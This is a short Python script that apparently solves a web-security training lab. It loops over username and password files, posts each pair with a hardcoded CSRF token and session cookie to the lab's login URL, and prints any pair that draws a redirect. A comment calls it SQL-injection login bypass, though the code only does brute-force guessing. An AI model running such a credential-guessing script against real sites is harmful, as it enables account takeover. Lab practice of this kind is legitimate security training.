from requests import Session
from os import path
from urllib3 import disable_warnings, exceptions


def lab(url):
    session = Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"})
    session.verify = False
    session.stream = False

    found = False
    with open(path.join(path.dirname(__file__), 'usernames.txt')) as users:
        for payload in users:

            with open(path.join(path.dirname(__file__), 'passwords.txt')) as passwords:
                for password in passwords:

                    if found:
                        found = False
                        break

                    username_encoded = payload.strip()
                    password_encoded = password.strip()
                    csrf = 'Wk23EctotdZp4OX5D2O8Pz3K0arRd2D2'
                    data = f'csrf={csrf}&username={username_encoded}&password={password_encoded}'
                    cookies = {"session": "qS4Q2tJmaIyVb0byh6jJrvqUIL4CFB4B"}

                    response = session.post(url=url, data=data, cookies=cookies, allow_redirects=False)

                    if response.status_code == 302:
                        print(f'PAYLOAD USERNAME FIELD {payload.strip()} PAYLOAD PASSWORD FIELD {password.strip()}')
                        found = True


# SQL injection vulnerability allowing login bypass
if __name__ == '__main__':
    disable_warnings(exceptions.InsecureRequestWarning)

    lab(
        'https://0ae4006f039b729ec018dad900be009a.web-security-academy.net/login'
    )
